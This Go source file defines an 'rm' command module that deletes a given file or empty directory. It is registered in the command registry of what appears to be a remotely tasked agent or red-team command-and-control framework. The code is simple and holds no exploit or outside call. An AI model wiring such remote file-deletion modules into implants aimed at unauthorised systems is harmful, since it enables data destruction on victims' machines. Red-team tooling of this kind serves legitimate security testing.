package common

import (
	"errors"
	"os"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// RM removes the given file or empty directory
type RM struct{}

// Name is the name of the command
func (p RM) Name() string {
	return "rm"
}

// Run removes the given file or empty directory
func (p RM) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) != 1 {
		return "", errors.New("rm takes 1 argument")
	}
	path := args[0]
	err := os.Remove(path)
	if err != nil {
		return "", err
	}
	return path + " has been removed.", nil
}

func init() {
	command.RegisterCommand(RM{})
}
